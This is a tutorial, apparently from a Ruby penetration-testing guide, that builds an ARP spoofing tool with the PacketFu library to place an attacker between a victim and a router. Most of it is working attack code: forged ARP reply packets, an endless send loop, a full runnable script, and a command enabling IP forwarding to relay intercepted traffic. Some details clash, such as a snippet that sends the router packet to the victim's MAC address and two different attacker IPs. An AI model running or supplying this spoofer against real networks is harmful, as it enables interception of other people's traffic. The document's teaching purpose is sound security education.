# ARP Spoofing

As you know, ARP Spoofing attack in the core of MitM attacks. In this part we'll know how to write simple and effective ARP spoofer tool to use it in later spoofing attacks.

## Scenario

We have 3 machines in this scenario as shown below.

```text
             |Attacker|
                 |
                 ٧
|Victim| -----------------> |Router| ---> Internet
```

Here the list of IP and MAC addresses of each of theme in the following table

| Host/Info | IP Address | MAC Address |
| :--- | :---: | :---: |
| Attacker | 192.168.0.100 | 3C:77:E6:68:66:E9 |
| Victim | 192.168.0.21 | 00:0C:29:38:1D:61 |
| Router | 192.168.0.1 | 00:50:7F:E6:96:20 |

To know our/attacker's interface information

```ruby
info = PacketFu::Utils.whoami?(:iface => "wlan0")
```

returns a hash

```text
{:iface=>"wlan0",
 :pcapfile=>"/tmp/out.pcap",
 :eth_saddr=>"3c:77:e6:68:66:e9",
 :eth_src=>"<w\xE6hf\xE9",
 :ip_saddr=>"192.168.0.13",
 :ip_src=>3232235533,
 :ip_src_bin=>"\xC0\xA8\x00\r",
 :eth_dst=>"\x00P\x7F\xE6\x96 ",
 :eth_daddr=>"00:50:7f:e6:96:20"}
```

So you can extract these information like any hash `info[:iface]`, `info[:ip_saddr]`, `info[:eth_saddr]`, etc..

**Building victim's ARP packet**

```ruby
# Build Ethernet header
arp_packet_victim = PacketFu::ARPPacket.new
arp_packet_victim.eth_saddr = "3C:77:E6:68:66:E9"       # our MAC address
arp_packet_victim.eth_daddr = "00:0C:29:38:1D:61"       # the victim's MAC address
# Build ARP Packet
arp_packet_victim.arp_saddr_mac = "3C:77:E6:68:66:E9"   # our MAC address
arp_packet_victim.arp_daddr_mac = "00:0C:29:38:1D:61"   # the victim's MAC address
arp_packet_victim.arp_saddr_ip = "192.168.0.1"          # the router's IP
arp_packet_victim.arp_daddr_ip = "192.168.0.21"         # the victim's IP
arp_packet_victim.arp_opcode = 2                        # arp code 2 == ARP reply
```

**Building router packet**

```ruby
# Build Ethernet header
arp_packet_router = PacketFu::ARPPacket.new
arp_packet_router.eth_saddr = "3C:77:E6:68:66:E9"       # our MAC address
arp_packet_router.eth_daddr = "00:0C:29:38:1D:61"       # the router's MAC address
# Build ARP Packet
arp_packet_router.arp_saddr_mac = "3C:77:E6:68:66:E9"   # our MAC address
arp_packet_router.arp_daddr_mac = "00:50:7F:E6:96:20"   # the router's MAC address
arp_packet_router.arp_saddr_ip = "192.168.0.21"         # the victim's IP
arp_packet_router.arp_daddr_ip = "192.168.0.1"          # the router's IP
arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
```

**Run ARP Spoofing attack**

```ruby
# Send our packet through the wire
while true
    sleep 1
    puts "[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}"
    arp_packet_victim.to_w(info[:iface])
    puts "[+] Sending ARP packet to router: #{arp_packet_router.arp_daddr_ip}"
    arp_packet_router.to_w(info[:iface])
end
```

Source

Wrapping all together and run as `root`

```ruby
#!/usr/bin/env ruby
#
# ARP Spoof Basic script
#
require 'packetfu'

attacker_mac = "3C:77:E6:68:66:E9"
victim_ip    = "192.168.0.21"
victim_mac   = "00:0C:29:38:1D:61"
router_ip    = "192.168.0.1"
router_mac   = "00:50:7F:E6:96:20"

info = PacketFu::Utils.whoami?(:iface => "wlan0")
#
# Victim
#
# Build Ethernet header
arp_packet_victim = PacketFu::ARPPacket.new
arp_packet_victim.eth_saddr = attacker_mac        # attacker MAC address
arp_packet_victim.eth_daddr = victim_mac          # the victim's MAC address
# Build ARP Packet
arp_packet_victim.arp_saddr_mac = attacker_mac    # attacker MAC address
arp_packet_victim.arp_daddr_mac = victim_mac      # the victim's MAC address
arp_packet_victim.arp_saddr_ip = router_ip        # the router's IP
arp_packet_victim.arp_daddr_ip = victim_ip        # the victim's IP
arp_packet_victim.arp_opcode = 2                  # arp code 2 == ARP reply

#
# Router
#
# Build Ethernet header
arp_packet_router = PacketFu::ARPPacket.new
arp_packet_router.eth_saddr = attacker_mac        # attacker MAC address
arp_packet_router.eth_daddr = router_mac          # the router's MAC address
# Build ARP Packet
arp_packet_router.arp_saddr_mac = attacker_mac    # attacker MAC address
arp_packet_router.arp_daddr_mac = router_mac      # the router's MAC address
arp_packet_router.arp_saddr_ip = victim_ip        # the victim's IP
arp_packet_router.arp_daddr_ip = router_ip        # the router's IP
arp_packet_router.arp_opcode = 2                  # arp code 2 == ARP reply

while true
    sleep 1
    puts "[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}"
    arp_packet_victim.to_w(info[:iface])
    puts "[+] Sending ARP packet to router: #{arp_packet_router.arp_daddr_ip}"
    arp_packet_router.to_w(info[:iface])
end
```

> Note: Don't forget to enable packet forwarding on your system to allow victim to browse internet.
>
> `echo "1" > /proc/sys/net/ipv4/ip_forward`

Returns, time to wiresharking ;\)

```text
[+] Sending ARP packet to victim: 192.168.0.21
[+] Sending ARP packet to router: 192.168.0.1
.
.
.
[+] Sending ARP packet to victim: 192.168.0.21
[+] Sending ARP packet to router: 192.168.0.1
[+] Sending ARP packet to victim: 192.168.0.21
[+] Sending ARP packet to router: 192.168.0.1
```

